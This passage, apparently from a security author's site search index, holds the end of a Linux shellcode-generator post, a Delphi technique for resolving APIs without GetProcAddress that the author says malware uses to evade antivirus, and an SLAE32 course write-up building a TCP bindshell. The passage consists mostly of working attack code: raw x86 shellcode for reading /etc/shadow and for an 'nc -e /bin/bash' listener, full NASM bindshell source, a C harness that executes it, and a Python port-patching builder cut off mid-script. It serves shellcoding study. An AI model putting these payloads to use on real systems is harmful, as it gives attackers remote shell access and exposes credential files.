\u0026quot;\\x89\\xe2\\xb0\\x0b\\xcd\\x80\u0026quot;; user@local:$ ./gen_cmd_shellcode.py \u0026quot;/bin/cat /etc/shadow\u0026quot;\n// Shellcode size = 70 unsigned char code[] = \\ \u0026quot;\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x69\\x6e\\x2f\\x2f\\x68\\x2f\\x2f\u0026quot; \u0026quot;\\x2f\\x62\\x89\\xe3\\x66\\xb8\\x2d\\x63\\x50\\x31\\xc0\\x89\\xe2\\x50\\x68\\x61\u0026quot; \u0026quot;\\x64\\x6f\\x77\\x68\\x63\\x2f\\x73\\x68\\x68\\x20\\x2f\\x65\\x74\\x68\\x2f\\x63\u0026quot; \u0026quot;\\x61\\x74\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe6\\x50\\x56\\x52\\x53\\x89\\xe1\\x50\u0026quot; \u0026quot;\\x89\\xe2\\xb0\\x0b\\xcd\\x80\u0026quot;; user@local:$ ./gen_cmd_shellcode.py \u0026quot;/bin/ip a \u0026amp;\u0026amp; /bin/uname -r\u0026quot;\n// Shellcode size = 80 unsigned char code[] = \\ \u0026quot;\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x69\\x6e\\x2f\\x2f\\x68\\x2f\\x2f\u0026quot; \u0026quot;\\x2f\\x62\\x89\\xe3\\x66\\xb8\\x2d\\x63\\x50\\x31\\xc0\\x89\\xe2\\x50\\x68\\x65\u0026quot; \u0026quot;\\x20\\x2d\\x72\\x68\\x75\\x6e\\x61\\x6d\\x68\\x62\\x69\\x6e\\x2f\\x68\\x26\\x26\u0026quot; \u0026quot;\\x20\\x2f\\x68\\x70\\x20\\x61\\x20\\x68\\x69\\x6e\\x2f\\x69\\x68\\x2f\\x2f\\x2f\u0026quot; \u0026quot;\\x62\\x89\\xe6\\x50\\x56\\x52\\x53\\x89\\xe1\\x50\\x89\\xe2\\xb0\\x0b\\xcd\\x80\u0026quot;; user@local:$ ./gen_cmd_shellcode.py \u0026quot;/bin/nc -lvp 443 -e /bin/bash\u0026quot;\n// Shellcode size = 85 unsigned char code[] = \\ \u0026quot;\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x69\\x6e\\x2f\\x2f\\x68\\x2f\\x2f\u0026quot; \u0026quot;\\x2f\\x62\\x89\\xe3\\x66\\xb8\\x2d\\x63\\x50\\x31\\xc0\\x89\\xe2\\x50\\x68\\x62\u0026quot; \u0026quot;\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2d\\x65\\x20\\x2f\\x68\\x34\\x34\u0026quot; \u0026quot;\\x33\\x20\\x68\\x6c\\x76\\x70\\x20\\x68\\x6e\\x63\\x20\\x2d\\x68\\x62\\x69\\x6e\u0026quot; \u0026quot;\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe6\\x50\\x56\\x52\\x53\\x89\\xe1\\x50\\x89\u0026quot; \u0026quot;\\xe2\\xb0\\x0b\\xcd\\x80\u0026quot;; user@local:$ ./gen_cmd_shellcode.py \u0026quot;/bin/cat /root/root.txt\u0026quot;\n// Shellcode size = 75 unsigned char code[] = \\ \u0026quot;\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x69\\x6e\\x2f\\x2f\\x68\\x2f\\x2f\u0026quot; \u0026quot;\\x2f\\x62\\x89\\xe3\\x66\\xb8\\x2d\\x63\\x50\\x31\\xc0\\x89\\xe2\\x50\\x68\\x2e\u0026quot; \u0026quot;\\x74\\x78\\x74\\x68\\x72\\x6f\\x6f\\x74\\x68\\x6f\\x6f\\x74\\x2f\\x68\\x74\\x20\u0026quot; \u0026quot;\\x2f\\x72\\x68\\x6e\\x2f\\x63\\x61\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe6\\x50\\x56\u0026quot; \u0026quot;\\x52\\x53\\x89\\xe1\\x50\\x89\\xe2\\xb0\\x0b\\xcd\\x80\u0026quot;; Afterword You may find a copy of all codes in the following repository : https://github.com/DarkCoderSc/slae32-reverse-shell\n"});index.add({'id':24,'href':'/docs/windows/snippets/delphi/getprocaddress-alternative/','title':"GetProcAddress API Alternative",'content':"In the past two days, I released examples about how to enumerate DLL export table through the PE Header.\nWe will see one concreate example of using the UntEnumDLLExport.pas library to dynamically load API without using the famous Windows API \u0026gt; GetProcAddress()\nThis technique is quite known and often used by some Malware, to mask which API\u0026rsquo;s they are dynamically loading and avoid Antivirus detection.\nTo do so, we still need to use LoadLibrary() first to load a DLL in memory and retrieve it address, then iterate through loaded DLL export table and catch target function address.\nCode (Require -\u0026gt; UntEnumDLLExport.pas) // Jean-Pierre LESUEUR (@DarkCoderSc) // ... uses tlhelp32, Windows, SysUtils, UntEnumDLLExport; // ... { Retrieve module full path from it handle (Returned by LoadLibrary()), we need that information to parse it PE Header and retrieve function address. } function GetModuleImagePath(hModule : HMODULE) : String; var ASnap : THandle; AModuleEntry : TModuleEntry32; const TH32CS_SNAPMODULE32 = $00000010; begin result := ''; /// ASnap := CreateToolHelp32Snapshot(TH32CS_SNAPMODULE or TH32CS_SNAPMODULE32, GetCurrentProcessId()); if ASnap = INVALID_HANDLE_VALUE then Exit(); try ZeroMemory(@AModuleEntry, SizeOf(TModuleEntry32)); AModuleEntry.dwSize := SizeOf(TModuleEntry32); /// if NOT Module32First(ASnap, AModuleEntry) then Exit(); if (AModuleEntry.hModule = hModule) then begin result := AModuleEntry.szExePath; Exit(); end; while True do begin ZeroMemory(@AModuleEntry, SizeOf(TModuleEntry32)); AModuleEntry.dwSize := SizeOf(TModuleEntry32); /// if NOT Module32Next(ASnap, AModuleEntry) then Break; if (AModuleEntry.hModule = hModule) then begin result := AModuleEntry.szExePath; break; end; end; finally CloseHandle(ASnap); end; end; { Retrieve function address from DLL PE Header Export Function Table. } function GetProcAddress_ALT(hModule : HMODULE; lpProcName : LPCSTR) : Pointer; var ADLLExport : TEnumDLLExport; I : Integer; begin result := nil; /// ADLLExport := TEnumDLLExport.Create(GetModuleImagePath(hModule)); if (ADLLExport.Enum \u0026gt; 0) then begin for I := 0 to ADLLExport.Items.Count -1 do begin if (ADLLExport.Items[i].Name.ToLower = String(lpProcName).ToLower) then begin result := Pointer(hModule + ADLLExport.Items[i].RelativeAddr); break; end; end; end; end; Hello World MessageBox Example //... procedure LoadAndTriggerMessageBox(); var _MessageBoxW : function(hWnd: HWND; lpText, lpCaption: LPCWSTR; uType: UINT): Integer; stdcall; hModule : HMODULE; begin _MessageBoxW := nil; hModule := LoadLibrary('user32.dll'); @_MessageBoxW := GetProcAddress_ALT(hModule, 'MessageBoxW'); if Assigned(_MessageBoxW) then _MessageBoxW(0, 'Hello World', 'Hey', 0); end; begin LoadAndTriggerMessageBox(); end. //... "});index.add({'id':25,'href':'/docs/linux/slae32/ex1-bindshell/','title':"Assignment N°1 - Bindshell (NASM)",'content':"Assignment Goals This paper is part of the certification process following the SLAE32 course (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.\nIf you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.\nWhy? the goal of that certification is to practice and learn how to solve each assignment by yourself. If you read this paper you will get spoiled and seriously oriented to my personal solution and take the risk to abuse of some shortcuts.\nStudent ID: SLAE-1530\n   Create a TCP Bindshell Shellcode for Linux x86-32.\n  The port number should be easily configurable.\n  Bonus if getting referenced in exploit-db or shell-storm.\n  TCP Bindshell Principle In few words, a TCP Bindshell is a tiny server program that waits for new clients on a specific port.\nWhen a new client connects to the server it will spawn a new shell (Ex: /bin/bash or /bin/sh) and \u0026ldquo;binds\u0026rdquo; its file descriptors stdin(0) stdout(1) stderr(2) to the new client socket.\nYes, a socket is nothing more than a file.\nOne infamous method to easily create a bindshell is to use Netcat as following:\nroot@local:# mknod /tmp/backpipe p \u0026amp;\u0026amp; /bin/sh 0\u0026lt;/tmp/backpipe | nc -lvp 443 1\u0026gt;/tmp/backpipe\nWhen you connect to port 443 (with any dumb client program ex: Netcat, Telnet) you will get remote control over shell instance.\nuser@local:$ nc 127.0.0.1 443\nOn Linux, you must have root privilege or capability to listen on a port. Keep that in mind if you try to execute a Bindshell Shellcode on a program without sufficient privilege.  Example Result Process Method 1 - Classic Required Syscalls Below table is ordered by syscall execution order.\n   Decimal N° Hex N° Name     359 0x167 socket()   54 0x36 setsockopt()   361 0x169 bind()   363 0x16b listen()   364 0x16c accept4()   63 0x3f dup2()   11 0xb execve()    This technique is what we would use if we were coding a classic server program using higher language (C/C++, Pascal etc..).\nIt is more readable and convenient. We won\u0026rsquo;t use that method for creating our bindshell shellcode, so we will just briefly enumerate required steps.\nSteps  Create a new IPv4/TCP socket using socket(). Call setsockopt() to avoid \u0026ldquo;address already in use\u0026rdquo; error. Call bind() to associate a local address to our socket. Tell our socket listen for new clients using listen(). Hang our program until a new client connects to our server and return a new client socket using accept4(). Duplicate stdin(0), stdout(1) and stderr(2) file descriptors with client socket using dup2(). Finally, spawn a new shell using execve() with /bin/sh or any shell you want.  For this exercise we will rather manipulate sockets only using one famous syscall: socketcall().\nMethod 2 - socketcall() Required Syscalls Below table is ordered by syscall execution order.\n   Decimal N° Hex N° Name     102 0x66 socketcall()   63 0x3f dup2()   11 0xb execve()    Steps are exactly the same as for classical method (see above) but this time only with three distinct syscalls to achieve the same result.\nWe will replace socket(), setsockopt(), bind(), listen() and accept() only with socketcall() calls.\nQuote from : socketcall man page\n« \u0026hellip; On a some architectures—for example, x86-64 and ARM—there is no socketcall() system call; instead socket(2), accept(2), bind(2), and so on really are implemented as separate system calls. \u0026hellip; »\n socketcall() usage schema It requires three registers: eax, ebx and ecx\n  eax register value needs to be set to 0x66 representing the syscall number for socketcall()\n  ebx register must contain the call number (see below table)\n     Call Number (Hex) Call Name Classic Equivalent     0x1 SYS_SOCKET socket()   0xd SYS_SETSOCKOPT setsockopt()   0xc SYS_BIND bind()   0x2 SYS_LISTEN listen()   0x3 SYS_ACCEPT accept()     ecx register contain an address pointing a stack location where additional parameters are placed if necessary.  Assembly Code Creation Plan Objectives Our objective wont be to create the smallest possible Shellcode.\nRather we will use more exotic things which requires more lengthy instructions.\nWe will only use push instruction one time in our code for preparing memory (nil memory). We will work manually on stack throughout the building of our shellcode.\nFinally last objective is to enjoy building that exercise and prepare ourself to abuse of GDB ☕\nPart I - Prepare Memory The very first step of our code is to prepare the memory. We will makes sure that a bunch of lower stack addresses are initialized with zero (around 30 is far enough) to ensure the stack is clean before doing manual memory manipulations.\nSome benefits include:\n Avoiding NULL characters in our final shellcode. Limiting instructions count (when working with parameters set to zero/NULL). Be freed of unexpected behaviors when setting a single byte or word to a specific stack location.  Part II - Create our Server We now safely work on stack addresses, we can continue on building our server. Five steps are required so far.\nStep 1 : Create Socket Syscall socketcall() will be used with ebx set to 0x1 = SYS_SOCKET.\nAdditional parameters needs to be set on stack:\n   Stack (Low Address)     AF_INET = 2 (4B)   SOCK_STREAM = 1 (4B)   AUTO = 0 (4B)    *Debugging* : return value (eax register) must be non negative. The function returns a new socket.  Step 2 : Fix occasional \u0026ldquo;address already in use\u0026rdquo; error Syscall socketcall() will be used with ebx set to 0xd = SYS_SETSOCKOPT.\nAdditional parameters needs to be set on stack:\n   Stack (Low Address)     socket handle (4B)   SOL_SOCKET = 1 (4B)   SO_REUSEADDR = 2 (4B)   addr_of(socketlen_t) (4B)   len(socketlen_t) = 4 (4B)    *Debugging* : return value (eax register) must be zero.  Step 3 : Associate local address to socket Syscall socketcall() will be used with ebx set to 0xc = SYS_BIND.\nAdditional parameters needs to be set on stack:\n   Stack (Low Address)     socket handle (4B)   addr_of(sockaddr_in) (4B)   len(sockaddr_in) (4B)   AF_INET = 2 (2B)   Port Number = htons(443) (2B)   0 = INADDR_ANY(0.0.0.0)(4B)   0 (8B)    *Debugging* : return value (eax register) must be zero.  Step 4 : Listen for incoming connections Syscall socketcall() will be used with ebx set to 0x2 = SYS_LISTEN.\nAdditional parameters needs to be set on stack:\n   Stack (Low Address)     socket handle (4B)   backlog = 0 (4B)    *Debugging* : return value (eax register) must be zero.  Step 5 : Acquire new client socket Syscall socketcall() will be used with ebx set to 0x3 = SYS_ACCEPT.\nAdditional parameters needs to be set on stack:\n   Stack (Low Address)     socket handle (4B)   NULL (sockaddr)   NULL len(sockaddr)    *Debugging* : return value (eax register) must be non negative. Function returns a new client socket.  Since by default we are using sockets in blocking mode, at this moment program will hang until a new client connects to our server (no panic, it is perfectly normal).  Part III - Duplicate File Descriptors Our server is now willing to acquire new clients, we will now focus on \u0026ldquo;binding\u0026rdquo; acquired client socket with stdin(0), stdout(1) and stderr(2) file descriptors.\nTo do so, we will use the function dup2() designated by the syscall 0x3f\n ebx register will contain the client socket handle. ecx register will contain the file descriptor number.  To avoid repeating code and increasing the shellcode size, we will loop from 0 to 2 (included).\nfor ($ecx = 0; $ecx \u0026lt;= 2; $ecx++){ dup2(c_socket, $ecx) } *Debugging* : eax must be greater or equal to zero. On success value is equal to value placed in `ecx` register.  PART IV - Execute a new /bin/sh shell This part focus on creating a classical execve() call to our desired shell. This syscall number is 0xb and as always placed inside eax register.\nFor pathname (ebx) we will push the string /bin/sh directly to stack. String slices must be aligned to 4 Bytes. Final string must be NULL terminated.\nFor argv (ecx), the best practice is to provide an address pointing to our shell string (/bin/sh)\nFinally argc (edx) will be set to NULL because unused.\nstack representation for ebx parameter\n   Stack (Low Address)     NULL (4B)   \u0026ldquo;hs//\u0026rdquo; (4B)   \u0026ldquo;nib/\u0026rdquo; (4B)    stack representation for ecx parameter\n   Stack (Low Address)     addr(\u0026quot;/bin/sh\u0026rdquo;)     Our recipe is now finished we can \u0026ldquo;safely\u0026rdquo; enter in the best part as fun as frustrating.\nIf we were expected to create a regular program, we would take care of closing both server and client socket before gracefully exiting our program. When creating shellcode we are not always excepted to do that unless we want to be sure we would not crash the whole vulnerable application.  TCP Bind Assembly Code (NASM) ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ; Filename : bindshell.nasm ; ; Author : Jean-Pierre LESUEUR ; ; Website : https://www.phrozen.io/ ; ; Email : jplesueur@phrozen.io ; ; Twitter : @DarkCoderSc ; ; ; ; --------------------------------------------------; ; SLAE32 Certification Exercise N°1 ; ; (Pentester Academy). ; ; https://www.pentesteracademy.com ; ; --------------------------------------------------; ; ; ; Purpose: ; ; --------------------------------------------------; ; Bind Shell ; ; Bind to 0.0.0.0:443 by default ; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ; nasm -f elf32 -o bindshell.o bindshell.nasm ; ld -o bindshell bindshell.o ; ./bindshell global _start\tsection .text _start: mov ebp, esp xor eax, eax xor ebx, ebx xor edx, edx xor esi, esi ; will contain our socket handle ;-------------------------------------------------------------------- ; fill 30 lower stack addresses with zero ; sufficient for our payload ;-------------------------------------------------------------------- xor ecx, ecx mov cl, 0x1e _zeromemory: push eax ; push 0x00000000 to stack loop _zeromemory mov esp, ebp ; stack pointer to initial location\t;-------------------------------------------------------------------- ; socket() ;-------------------------------------------------------------------- mov bl, 0x1 ; SYS_SOCKET mov byte [esp-0x8], 0x1 ; SOCK_STREAM mov byte [esp-0xc], 0x2 ; AF_INET sub esp, 0xc mov ecx, esp mov al, 0x66 ; socketcall() syscall number int 0x80 mov esi, eax ; save new socket handle ;-------------------------------------------------------------------- ; setsockopt() ;-------------------------------------------------------------------- xor eax, eax add bl, 0xd ; SYS_SETSOCKOPT mov byte [esp-0x4], 0x4 ; length of socklen_t sub esp, 0x4 mov dword [esp-0x4], esp ; addr of socklen_t mov byte [esp-0x8], 0x2 ; SO_REUSEADDR mov byte [esp-0xc], 0x1 ; SOL_SOCKET mov dword [esp-0x10], esi ; socket handle sub esp, 0x10 mov ecx, esp mov al, 0x66 ; socketcall() syscall number int 0x80 ;-------------------------------------------------------------------- ; bind() ;-------------------------------------------------------------------- xor eax, eax sub bl, 0xc ; SYS_BIND ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ; struct sockaddr_in /* Size = 16B */ { ;; ;\tshort sin_family;\t// 2B ;; ;\tunsigned short sin_port;\t// 2B ;; ;\tlong s_addr; // 4B ;; ;\tchar sin_zero[8];\t// 8B ;; ; } ;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ; prepare sockaddr_in struct mov al, 0x01 mov ah, 0xbb mov word [esp-0xe], ax ; port = 443 mov byte [esp-0x10], 0x2 ; AF_INET xor eax, eax mov al, 0x10 sub esp, eax mov byte [esp-0x4], 0x10 ; length sockaddr_in (16 Bytes) mov dword [esp-0x8], esp ; addr of sockaddr_in mov dword [esp-0xc], esi ; our socket handle sub esp, 0xc mov ecx, esp xor eax, eax mov al, 0x66 ; socketcall() syscall number int 0x80 ;-------------------------------------------------------------------- ; listen() ;-------------------------------------------------------------------- add bl, 2 ; SYS_LISTEN\tmov dword [esp-0x8], esi ; out socket handle sub esp, 0x8 mov ecx, esp mov al, 0x66 ; socketcall() syscall number int 0x80 ;-------------------------------------------------------------------- ; accept() ;-------------------------------------------------------------------- inc bl ; SYS_ACCEPT mov [esp-0xc], esi ; out socket handle sub esp, 0xc mov ecx, esp mov al, 0x66 ; socketcall() syscall number int 0x80 mov ebx, eax ; assign our new client socket to ebx ;-------------------------------------------------------------------- ; dup2() : Loop from 0 to 2 ; (stdin, stdout, stderr) ;-------------------------------------------------------------------- xor ecx, ecx _dup2:\txor eax, eax\tmov al, 0x3f int 0x80 inc cl cmp cl, 0x2 jle _dup2 ;-------------------------------------------------------------------- ; execve() ;-------------------------------------------------------------------- xor eax, eax xor ebx, ebx xor ecx, ecx ; /bin/sh mov dword [esp-0x8], 0x68732f2f mov dword [esp-0xc], 0x6e69622f sub esp, 0xc mov ebx, esp sub esp, 0x4 mov edx, esp mov dword [esp-0x4], ebx sub esp, 0x4 mov ecx, esp mov al, 0xb ; execve() syscall number int 0x80 Compile and Test our Payload user@local:$ nasm -f elf32 -o bindshell.o bindshell.nasm\nuser@local:$ ld -o bindshell bindshell.o\nRemember, we must be root.  root@local:$ ./bindshell\nFinal Payload (Raw) We will use a famous command from commandlinefu and extract opcodes from our binary.\nuser@local:$ objdump -d ./bindshell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/\u0026quot;/'|sed 's/$/\u0026quot;/g'-v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\\t' '\n\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xd2\\x31\\xf6\\x31\\xc9\\xb1\\x1e\\x50\\xe2 \\xfd\\x89\\xec\\xb3\\x01\\xc6\\x44\\x24\\xf8\\x01\\xc6\\x44\\x24\\xf4\\x02\\x83 \\xec\\x0c\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x89\\xc6\\x31\\xc0\\x80\\xc3\\x0d\\xc6 \\x44\\x24\\xfc\\x04\\x83\\xec\\x04\\x89\\x64\\x24\\xfc\\xc6\\x44\\x24\\xf8\\x02 \\xc6\\x44\\x24\\xf4\\x01\\x89\\x74\\x24\\xf0\\x83\\xec\\x10\\x89\\xe1\\xb0\\x66 \\xcd\\x80\\x31\\xc0\\x80\\xeb\\x0c\\xb0\\x01\\xb4\\xbb\\x66\\x89\\x44\\x24\\xf2 \\xc6\\x44\\x24\\xf0\\x02\\x31\\xc0\\xb0\\x10\\x29\\xc4\\xc6\\x44\\x24\\xfc\\x10 \\x89\\x64\\x24\\xf8\\x89\\x74\\x24\\xf4\\x83\\xec\\x0c\\x89\\xe1\\x31\\xc0\\xb0 \\x66\\xcd\\x80\\x80\\xc3\\x02\\x89\\x74\\x24\\xf8\\x83\\xec\\x08\\x89\\xe1\\xb0 \\x66\\xcd\\x80\\xfe\\xc3\\x89\\x74\\x24\\xf4\\x83\\xec\\x0c\\x89\\xe1\\xb0\\x66 \\xcd\\x80\\x89\\xc3\\x31\\xc9\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\xfe\\xc1\\x80\\xf9 \\x02\\x7e\\xf3\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xc7\\x44\\x24\\xf8\\x2f\\x2f\\x73 \\x68\\xc7\\x44\\x24\\xf4\\x2f\\x62\\x69\\x6e\\x83\\xec\\x0c\\x89\\xe3\\x83\\xec \\x04\\x89\\xe2\\x89\\x5c\\x24\\xfc\\x83\\xec\\x04\\x89\\xe1\\xb0\\x0b\\xcd\\x80 To ensure our shellcode is working when embedded inside a willingly vulnerable program, we will paste it inside our SLAE32 shellcode.c template file.\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char code[] = \\ \u0026quot;\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xd2\\x31\\xf6\\x31\\xc9\\xb1\\x1e\\x50\\xe2\u0026quot; \u0026quot;\\xfd\\x89\\xec\\xb3\\x01\\xc6\\x44\\x24\\xf8\\x01\\xc6\\x44\\x24\\xf4\\x02\\x83\u0026quot; \u0026quot;\\xec\\x0c\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x89\\xc6\\x31\\xc0\\x80\\xc3\\x0d\\xc6\u0026quot; \u0026quot;\\x44\\x24\\xfc\\x04\\x83\\xec\\x04\\x89\\x64\\x24\\xfc\\xc6\\x44\\x24\\xf8\\x02\u0026quot; \u0026quot;\\xc6\\x44\\x24\\xf4\\x01\\x89\\x74\\x24\\xf0\\x83\\xec\\x10\\x89\\xe1\\xb0\\x66\u0026quot; \u0026quot;\\xcd\\x80\\x31\\xc0\\x80\\xeb\\x0c\\xb0\\x01\\xb4\\xbb\\x66\\x89\\x44\\x24\\xf2\u0026quot; \u0026quot;\\xc6\\x44\\x24\\xf0\\x02\\x31\\xc0\\xb0\\x10\\x29\\xc4\\xc6\\x44\\x24\\xfc\\x10\u0026quot; \u0026quot;\\x89\\x64\\x24\\xf8\\x89\\x74\\x24\\xf4\\x83\\xec\\x0c\\x89\\xe1\\x31\\xc0\\xb0\u0026quot; \u0026quot;\\x66\\xcd\\x80\\x80\\xc3\\x02\\x89\\x74\\x24\\xf8\\x83\\xec\\x08\\x89\\xe1\\xb0\u0026quot; \u0026quot;\\x66\\xcd\\x80\\xfe\\xc3\\x89\\x74\\x24\\xf4\\x83\\xec\\x0c\\x89\\xe1\\xb0\\x66\u0026quot; \u0026quot;\\xcd\\x80\\x89\\xc3\\x31\\xc9\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\xfe\\xc1\\x80\\xf9\u0026quot; \u0026quot;\\x02\\x7e\\xf3\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xc7\\x44\\x24\\xf8\\x2f\\x2f\\x73\u0026quot; \u0026quot;\\x68\\xc7\\x44\\x24\\xf4\\x2f\\x62\\x69\\x6e\\x83\\xec\\x0c\\x89\\xe3\\x83\\xec\u0026quot; \u0026quot;\\x04\\x89\\xe2\\x89\\x5c\\x24\\xfc\\x83\\xec\\x04\\x89\\xe1\\xb0\\x0b\\xcd\\x80\u0026quot;; main() { printf(\u0026quot;Shellcode Length: %d\\n\u0026quot;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } user@local:$ gcc shellcode.c -o shellcode -z execstack\nroot@local:$ ./shellcode\nRemember(2), we must be root.  Shellcode Builder (Python3) Last and not mandatory exercise goal is to propose a way to replace default TCP port number (in our case 443) with any ports from 0 to 65535.\nThis part is quite hard to explain so I wont promise it will be the clearer possible. Forgive me in advance.\nWe absolutely need to take care of two important things:\nN°1 Port number needs to be converted in Big-Endian as required by documentation related to networking programming then hex encoded.\nOutput port needs to be inserted in reverse order inside our payload.\n N°2 Lets imagine we have port 443 which gives 0xbb01 (converted and encoded), in this case everything is fine but what if we use a port converted and encoded as 0x0080, well it will be padded with a NULL character and it is punished by law to keep a NULL character inside our shellcode.    Solving first point is simple as using the htons() function from socket python library then classically encode output as hexadecimal string.\nSolving the second issue requires more work (I particularly felt trolled by this part).\nFortunately this issue was anticipated in our code and voluntarily left unexplained until now.\nmov al, 0x01 mov ah, 0xbb mov word [esp-0xe], ax ; port = 443 A port number is a word (2 Bytes), to its must be greater or equal to 0x100 to be free of NULL character. Lets imagine if we were doing this way:\nmov eax, 0xbb01 mov dword [esp-0xe], eax This would result having two NULL characters since eax is a 4 bytes register and we are placing only two bytes inside.\nIn this specific case we could easily fix that issue with bellow code:\nmov ax, 0xbb01 mov word [esp-0xe], ax This will work if we are using a port above 0x100 but what if our TCP port is in the lower range. It will result to a NULL character ax is 2 bytes long and we are placing a single byte.\nOne solution is to move the port in two set of instructions.\nFirst we move the first byte to the ah register, then we move the second byte to al register.\nIf we are using a port below 0x100, we will singly remove from our raw shellcode instruction mov al, ... (designated by opcodes \\xb0\\xb01).\nBuilder Code (Python3) This technique is the first techniques that came in my mind, there are literally infinite ways of doing.  #!/usr/bin/python3 ''' Jean-Pierre LESUEUR @DarkCoderSc jplesueur@phrozen.io https://www.phrozen.io *** SLAE32 Certification Exercise N°1 (Pentester Academy). https://www.pentesteracademy.com *** Description: This python script will generate the final payload with desired TCP port number. ''' import socket import sys from textwrap import wrap shellcode = ( \u0026quot;\\\\x89\\\\xe5\\\\x31\\\\xc0\\\\x31\\\\xdb\\\\x31\\\\xd2\\\\x31\\\\xf6\\\\x31\\\\xc9\\\\xb1\\\\x1e\\\\x50\\\\xe2\u0026quot; \u0026quot;\\\\xfd\\\\x89\\\\xec\\\\xb3\\\\x01\\\\xc6\\\\x44\\\\x24\\\\xf8\\\\x01\\\\xc6\\\\x44\\\\x24\\\\xf4\\\\x02\\\\x83\u0026quot; \u0026quot;\\\\xec\\\\x0c\\\\x89\\\\xe1\\\\xb0\\\\x66\\\\xcd\\\\x80\\\\x89\\\\xc6\\\\x31\\\\xc0\\\\x80\\\\xc3\\\\x0d\\\\xc6\u0026quot; \u0026quot;\\\\x44\\\\x24\\\\xfc\\\\x04\\\\x83\\\\xec\\\\x04\\\\x89\\\\x64\\\\x24\\\\xfc\\\\xc6\\\\x44\\\\x24\\\\xf8\\\\x02\u0026quot; \u0026quot;\\\\xc6\\\\x44\\\\x24\\\\xf4\\\\x01\\\\x89\\\\x74\\\\x24\\\\xf0\\\\x83\\\\xec\\\\x10\\\\x89\\\\xe1\\\\xb0\\\\x66\u0026quot; \u0026quot;\\\\xcd\\\\x80\\\\x31\\\\xc0\\\\x80\\\\xeb\\\\x0c\\\\xb0\\\\x01\\\\xb4\\\\xbb\\\\x66\\\\x89\\\\x44\\\\x24\\\\xf2\u0026quot; \u0026quot;\\\\xc6\\\\x44\\\\x24\\\\xf0\\\\x02\\\\x31\\\\xc0\\\\xb0\\\\x10\\\\x29\\\\xc4\\\\xc6\\\\x44\\\\x24\\\\xfc\\\\x10\u0026quot; \u0026quot;\\\\x89\\\\x64\\\\x24\\\\xf8\\\\x89\\\\x74\\\\x24\\\\xf4\\\\x83\\\\xec\\\\x0c\\\\x89\\\\xe1\\\\x31\\\\xc0\\\\xb0\u0026quot; \u0026quot;\\\\x66\\\\xcd\\\\x80\\\\x80\\\\xc3\\\\x02\\\\x89\\\\x74\\\\x24\\\\xf8\\\\x83\\\\xec\\\\x08\\\\x89\\\\xe1\\\\xb0\u0026quot; \u0026quot;\\\\x66\\\\xcd\\\\x80\\\\xfe\\\\xc3\\\\x89\\\\x74\\\\x24\\\\xf4\\\\x83\\\\xec\\\\x0c\\\\x89\\\\xe1\\\\xb0\\\\x66\u0026quot; \u0026quot;\\\\xcd\\\\x80\\\\x89\\\\xc3\\\\x31\\\\xc9\\\\x31\\\\xc0\\\\xb0\\\\x3f\\\\xcd\\\\x80\\\\xfe\\\\xc1\\\\x80\\\\xf9\u0026quot; \u0026quot;\\\\x02\\\\x7e\\\\xf3\\\\x31\\\\xc0\\\\x31\\\\xdb\\\\x31\\\\xc9\\\\xc7\\\\x44\\\\x24\\\\xf8\\\\x2f\\\\x2f\\\\x73\u0026quot; \u0026quot;\\\\x68\\\\xc7\\\\x44\\\\x24\\\\xf4\\\\x2f\\\\x62\\\\x69\\\\x6e\\\\x83\\\\xec\\\\x0c\\\\x89\\\\xe3\\\\x83\\\\xec\u0026quot; \u0026quot;\\\\x04\\\\x89\\\\xe2\\\\x89\\\\x5c\\\\x24\\\\xfc\\\\x83\\\\xec\\\\x04\\\\x89\\\\xe1\\\\xb0\\\\x0b\\\\xcd\\\\x80\u0026quot; ) if len(sys.argv) != 2: print(\u0026quot;Usage: ./gen_bindshell.py \u0026lt;port_number\u0026gt;\u0026quot;) else: tcp_port = int(sys.argv[1]) if (tcp_port \u0026gt; 65535) or (tcp_port \u0026lt; 0): print(\u0026quot;Invalid port number (0..65535)\u0026quot;) else: # # Format port # raw_port = ('{:04x}'.format(socket.htons(tcp_port)))\traw_port_1 = \u0026quot;\\\\x{}\u0026quot;.format(raw_port[2:4]) raw_port_2 = \u0026quot;\\\\x{}\u0026quot;.format(raw_port[:2])\t# # Modify existing shellcode (hundred of possibilities)\t# if raw_port_1 == \u0026quot;\\\\x00\u0026quot;: shellcode = shellcode.replace(\u0026quot;\\\\xb0\\\\x01\u0026quot;, \u0026quot;\u0026quot;) else: shellcode = shellcode.replace(\u0026quot;\\\\xb0\\\\x01\u0026quot;, \u0026quot;\\\\xb0{}\u0026quot;.format(raw_port_1)) shellcode = shellcode.replace(\u0026quot;\\\\xb4\\\\xbb\u0026quot;, \u0026quot;\\\\xb4{}\u0026quot;.format(raw_port_2)) #shellcode = shellcode.replace(\u0026quot;\\\\x01\\\\xbb\u0026quot;, patch) final_payload = 